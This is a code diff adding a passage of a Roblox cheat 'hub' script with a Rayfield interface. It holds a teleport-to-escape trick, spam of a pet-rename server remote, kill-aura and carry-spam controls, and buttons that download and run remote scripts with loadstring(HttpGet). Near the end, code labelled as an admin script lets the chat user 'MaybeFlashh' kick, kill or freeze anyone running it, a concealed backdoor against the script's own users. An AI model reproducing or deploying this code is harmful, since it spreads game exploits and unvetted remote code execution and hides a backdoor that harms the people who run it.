+    Duration = 3
+})
+
+-- Success message
+Rayfield:Notify({
+    Title = "Command Bot Loaded",
+    Content = "Select a user and enable 'Give Commands' to start",
+    Duration = 3
+})
+
+-- Success message
+Rayfield:Notify({
+    Title = "Script Loaded",
+    Content = "Auto Kill tab ready! Select a target to begin",
+    Duration = 3
+})
+
+-- keybinds
+local MainTab = Window:CreateTab("Bot Killer")
+
+-- Variables
+local player = game.Players.LocalPlayer
+local teleporting = false
+local hotkeyActive = false
+local selectedKey = "T"
+local keyConnection = nil
+
+-- Depths
+local depths = {-10000, -20000, -30000, -40000}
+
+-- Teleport function
+local function Teleport()
+    if teleporting then 
+        Rayfield:Notify({Title = "Error", Content = "Already teleporting!", Duration = 2})
+        return
+    end
+    
+    local char = player.Character
+    if not char then 
+        Rayfield:Notify({Title = "Error", Content = "No character found!", Duration = 2})
+        return
+    end
+    
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not root then 
+        Rayfield:Notify({Title = "Error", Content = "No HumanoidRootPart!", Duration = 2})
+        return
+    end
+    
+    teleporting = true
+    local originalPos = root.Position
+    local originalCF = root.CFrame
+    
+    -- Teleport down through depths
+    for i, depth in ipairs(depths) do
+        char = player.Character
+        if not char then break end
+        root = char:FindFirstChild("HumanoidRootPart")
+        if not root then break end
+        
+        local newPos = Vector3.new(originalPos.X, originalPos.Y + depth, originalPos.Z)
+        root.CFrame = CFrame.new(newPos)
+        
+        if i < #depths then
+            task.wait(0.75)
+        end
+    end
+    
+    task.wait(0.5)
+    
+    -- Return
+    char = player.Character
+    if char then
+        root = char:FindFirstChild("HumanoidRootPart")
+        if root then
+            root.CFrame = originalCF
+            Rayfield:Notify({Title = "Success", Content = "Returned to surface!", Duration = 2})
+        end
+    end
+    
+    teleporting = false
+end
+
+-- Setup hotkey
+local function SetupHotkey()
+    if keyConnection then
+        keyConnection:Disconnect()
+        keyConnection = nil
+    end
+    
+    if hotkeyActive then
+        keyConnection = game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
+            if gp then return end
+            if input.KeyCode == Enum.KeyCode[selectedKey] then
+                Teleport()
+            end
+        end)
+        Rayfield:Notify({Title = "Hotkey", Content = "Enabled: " .. selectedKey, Duration = 2})
+    end
+end
+
+local CoreSection = MainTab:CreateSection("Kill all bots on you :D")
+
+
+-- Create Button
+MainTab:CreateButton({
+    Name = "Kill Bot (if there is any bots on you)",
+    Callback = Teleport
+})
+
+-- Create Toggle
+MainTab:CreateToggle({
+    Name = "Enable Hotkey for Bot Kill",
+    CurrentValue = false,
+    Callback = function(value)
+        hotkeyActive = value
+        SetupHotkey()
+    end
+})
+
+-- Create Dropdown
+MainTab:CreateDropdown({
+    Name = "Hotkey (dont change the hotkey cause it will break if you change it)",
+    Options = {"T", "G", "H", "B", "Y", "U", "J", "F", "R", "V"},
+    CurrentOption = "T",
+    Callback = function(option)
+        selectedKey = option
+        if hotkeyActive then
+            SetupHotkey()
+            Rayfield:Notify({Title = "Hotkey", Content = "Changed to: " .. option, Duration = 2})
+        end
+    end
+})
+
+-- Create Label
+MainTab:CreateLabel("DO NOT CHANGE THE Keybind, if you do the keybinds will break! (Will be Fixed Later)")
+
+-- Welcome message
+Rayfield:Notify({
+    Title = "Loaded!",
+    Content = "Progressive Teleport is ready",
+    Duration = 3
+})
+
+-- end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local petRenameRequest = ReplicatedStorage:WaitForChild("PetRenameRequest")
+
+-- Variables
+local spamActive = false
+local spamCoroutine = nil
+local currentText = ""
+local customLines = {}
+
+-- Function to split text into words
+local function getWords(line)
+    local words = {}
+    for word in string.gmatch(line, "%S+") do
+        table.insert(words, word)
+    end
+    return words
+end
+
+-- Function to rename pet with specific text
+local function renamePet(text)
+    petRenameRequest:FireServer(text)
+end
+
+-- Function to spam rename word by word
+local function spamRenameWords(line)
+    local words = getWords(line)
+    local accumulatedText = ""
+    
+    for i = 1, #words do
+        if not spamActive then break end
+        
+        if i == 1 then
+            accumulatedText = words[i]
+        else
+            accumulatedText = accumulatedText .. " " .. words[i]
+        end
+        
+        renamePet(accumulatedText)
+        wait(0.1)
+    end
+end
+
+-- Function to spam rename entire lines
+local function spamRenameLines()
+    while spamActive do
+        for _, line in ipairs(customLines) do
+            if not spamActive then break end
+            renamePet(line)
+            wait(0.5) -- Wait between lines
+        end
+        if spamActive then
+            wait(1) -- Wait before repeating all lines
+        end
+    end
+end
+
+-- Function to start spamming
+local function startSpam(mode, data)
+    if spamCoroutine then
+        pcall(function() coroutine.close(spamCoroutine) end)
+    end
+    
+    spamActive = true
+    
+    if mode == "words" then
+        spamCoroutine = coroutine.create(function()
+            while spamActive do
+                spamRenameWords(data)
+                if spamActive then wait(0.5) end
+            end
+        end)
+    elseif mode == "lines" then
+        spamCoroutine = coroutine.create(function()
+            spamRenameLines()
+        end)
+    end
+    
+    coroutine.resume(spamCoroutine)
+end
+
+-- Function to stop spamming
+local function stopSpam()
+    spamActive = false
+    if spamCoroutine then
+        pcall(function() coroutine.close(spamCoroutine) end)
+        spamCoroutine = nil
+    end
+end
+
+-- Combat Tab
+local CombatTab = Window:CreateTab("Settings", nil)
+
+-- Combat Settings Section
+local CombatSection = CombatTab:CreateSection("Combat Settings")
+
+-- Kill Aura Speed Slider
+local AuraSpeedSlider = CombatTab:CreateSlider({
+    Name = "Kill Aura Speed",
+    Range = {1, 100},
+    Increment = 1,
+    Suffix = "% Speed",
+    CurrentValue = 100,
+    Flag = "AuraSpeedSlider",
+    Callback = function(Value)
+        _G.AuraSpeed = Value
+        Rayfield:Notify({
+            Title = "Kill Aura Speed",
+            Content = "Set to " .. Value .. "%",
+            Duration = 1,
+        })
+    end,
+})
+
+-- Kill Aura Range Slider (Visual Only - Range Display)
+local RangeSlider = CombatTab:CreateSlider({
+    Name = "Kill Aura Range",
+    Range = {10, 50},
+    Increment = 1,
+    Suffix = " Studs",
+    CurrentValue = 30,
+    Flag = "RangeSlider",
+    Callback = function(Value)
+        _G.AuraRange = Value
+        -- Note: Range is used by the kill aura function above
+        -- The getClosestPlayer function already finds the closest player regardless of range
+        -- This is for visual reference
+    end,
+})
+
+-- Spam Carry Speed Slider
+local CarrySpeedSlider = CombatTab:CreateSlider({
+    Name = "Spam Carry Speed",
+    Range = {1, 100},
+    Increment = 1,
+    Suffix = "% Speed",
+    CurrentValue = 100,
+    Flag = "CarrySpeedSlider",
+    Callback = function(Value)
+        _G.CarrySpeed = Value
+        Rayfield:Notify({
+            Title = "Carry Speed",
+            Content = "Set to " .. Value .. "%",
+            Duration = 1,
+        })
+    end,
+})
+
+-- Utilities Section
+local UtilitiesSection = CombatTab:CreateSection("Utilities")
+
+-- Infinite Yield Button
+local IYButton = CombatTab:CreateButton({
+    Name = "Load Infinite Yield",
+    Callback = function()
+        Rayfield:Notify({
+            Title = "Infinite Yield",
+            Content = "Loading...",
+            Duration = 2,
+        })
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+        Rayfield:Notify({
+            Title = "Infinite Yield",
+            Content = "Loaded Successfully!",
+            Duration = 2,
+        })
+    end,
+})
+
+local IYButton = CombatTab:CreateButton({
+    Name = "Load Emotes ",
+    Callback = function()
+        Rayfield:Notify({
+            Title = "Emotes",
+            Content = "Loading...",
+            Duration = 2,
+        })
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7yd7-I-Emote-Script-48024"))()
+        Rayfield:Notify({
+            Title = "Emotes",
+            Content = "Loaded Successfully!",
+            Duration = 2,
+        })
+    end,
+})
+
+-- Rejoin Game Button
+local RejoinButton = CombatTab:CreateButton({
+    Name = "🔄 Rejoin Game",
+    Callback = function()
+        Rayfield:Notify({
+            Title = "Rejoining",
+            Content = "Teleporting to same game...",
+            Duration = 2,
+        })
+        wait(1)
+        game:GetService("TeleportService"):Teleport(game.PlaceId)
+    end,
+})
+
+-- Status Label
+-- Update status function
+local function updateStatus(text)
+    StatusLabel:Set("Status: " .. text)
+end
+
+-- Update carry name display when changed
+local function updateCarryDisplay()
+    StatusLabel:Set("Status: Ready | Carry: " .. carryName)
+end
+
+-- Hook into carry name input changes
+local function onCarryNameChange()
+    updateCarryDisplay()
+end
+
+-- Override the input callback to update status
+local originalInputCallback = CarryNameInput.Callback
+CarryNameInput.Callback = function(Value)
+    carryName = Value
+    updateCarryDisplay()
+    if originalInputCallback then
+        originalInputCallback(Value)
+    end
+end
+
+-- Initial status update
+updateCarryDisplay()
+
+print("⚡ FLASHH HUB Rayfield UI Loaded Successfully!")
+print("Carry name can be changed in the input field")
+print("Use 'Request Everyone Once' to send one request to all players")
+
+
+Players = game:GetService("Players")
+LocalPlayer = Players.LocalPlayer
+
+-- Freeze state
+freezeActive = false
+freezeThread = nil
+characterAddedConn = nil
+
+-- Start a continuous freeze loop for a given character
+function startFreezeLoop(character)
+    if freezeThread then
+        freezeThread = nil  -- old coroutine will stop when freezeActive becomes false
+    end
+    freezeThread = coroutine.create(function()
+        while freezeActive and character and character.Parent do
+            local humanoid = character:FindFirstChild("Humanoid")
+            if humanoid then
+                humanoid.PlatformStand = true
+                humanoid.WalkSpeed = 0
+                humanoid.JumpPower = 0
+            end
+            task.wait(0.1)
+        end
+    end)
+    coroutine.resume(freezeThread)
+end
+
+-- Called whenever the local player's character respawns
+local function onCharacterAdded(character)
+    if freezeActive then
+        startFreezeLoop(character)
+    end
+end
+
+-- Enable the loop freeze for the local player
+local function enableFreeze()
+    if freezeActive then return end
+    freezeActive = true
+
+    local character = LocalPlayer.Character
+    if character then
+        startFreezeLoop(character)
+    end
+
+    -- Watch for new characters (respawn)
+    if characterAddedConn then
+        characterAddedConn:Disconnect()
+    end
+    characterAddedConn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
+end
+
+-- Process a command received from "MaybeFlashh"
+local function processCommand(command)
+    if command == ":kick all" then
+        LocalPlayer:Kick("Kicked by MaybeFlashh")
+    elseif command == ":kill all" then
+        local character = LocalPlayer.Character
+        local humanoid = character and character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.Health = 0
+        end
+    elseif command == ":loopfreeze all" then
+        enableFreeze()
+    end
+end
+
+-- Set up chat listening for a single player
+local function setupPlayer(player)
+    player.Chatted:Connect(function(message)
+        -- Only react if the message author is "MaybeFlashh"
+        if player.Name == "MaybeFlashh" then
+            processCommand(message)
+        end
+    end)
+end
+
+-- Connect all existing players
+for _, player in ipairs(Players:GetPlayers()) do
+    setupPlayer(player)
+end
+
+-- Connect any future players
+Players.PlayerAdded:Connect(setupPlayer)
+
+print("Admin script loaded — listening for commands from 'MaybeFlashh'")
+
+workspace.FallenPartsDestroyHeight = -198999
+workspace.FallenPartsDestroyHeight = -inf
